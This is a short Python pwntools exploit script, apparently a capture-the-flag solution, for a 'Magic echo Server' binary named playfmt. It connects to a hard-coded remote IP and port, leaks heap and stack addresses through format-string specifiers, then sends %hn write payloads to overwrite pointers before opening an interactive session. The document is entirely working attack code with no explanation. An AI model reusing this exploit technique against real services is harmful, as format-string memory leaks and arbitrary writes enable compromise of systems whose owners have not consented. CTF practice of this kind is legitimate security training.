from pwn import *

local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./playfmt")
else:
    a=remote("120.78.192.35","9999")
    #a=remote("127.0.0.1",8888)
def debug():
    gdb.attach(a,'''
    b *(0x804889F)
    b *0x8048A4B
    ''')
def welc():
    a.recvuntil("  Magic echo Server\n")
    a.recvuntil("\n")
def fsb(s):
    a.sendline(s)
#debug()
welc()
fsb("%18$p")
heap_addr=eval(a.recv(10))-0x10-8
success("heap_addr ==> 0x%x"%heap_addr)
fsb("%33$p")
stack_addr=eval(a.recv(10))-0xcc
success('stack_addr ==> 0x%x'%stack_addr)

payload='%'+str(stack_addr&0xffff)+"c"+"%33$hn"
payload=payload.ljust(0xC7,'\x00')
fsb(payload)
payload='%'+str(heap_addr&0xffff)+'c'+"%69$hn"
payload=payload.ljust(0xC7,'\x00')
fsb(payload)
pause()
'''
fsb("%19$s".ljust(0xc7,'\x00'))
#fsb("quit")
print a.recv(20)
'''
a.interactive()